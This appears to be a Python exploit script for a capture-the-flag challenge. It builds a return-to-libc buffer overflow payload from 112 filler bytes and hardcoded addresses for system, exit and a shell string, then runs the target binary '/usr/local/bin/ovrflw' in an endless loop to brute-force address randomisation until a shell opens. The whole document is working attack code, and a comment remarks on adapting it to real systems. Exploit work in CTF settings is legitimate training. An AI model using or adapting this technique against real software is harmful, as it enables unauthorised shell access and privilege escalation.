from subprocess import call
import struct
""" Creating the Buffer Overflow """
""" | NOPS | SHELLCODE | POTENTIAL BUFFER | NOT OVERWRITEABLE RET DUE TO PROTECTION | """
''' |      112 <= N                       | 4 BYTES (EIP)       ''' 
# ADRESS SPACE RANDOMIZATION ENABLED.

#Instructions are for the CTF Chall the same, but irl ,one needs to ofc grep the real adresses :P
libc_base_addr = 0xb7588000 #Randomized Layer Adresses enabled.
sys_offset = 0x00040310
ext_offset = 0x00033260
sh = 0x00162bac 

sys_addr = struct.pack('<I',libc_base_addr + sys_offset)
exit_addr = struct.pack('<I',libc_base_addr + ext_offset)
sh_addr = struct.pack('<I',libc_base_addr + sh)

buf = "B" * 112
buf += sys_addr
buf += exit_addr
buf += sh_addr

#INIFITE LOOPIIIIIEEE
while True:
    ret = call(["/usr/local/bin/ovrflw", buf])

""" BBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ZZZZ """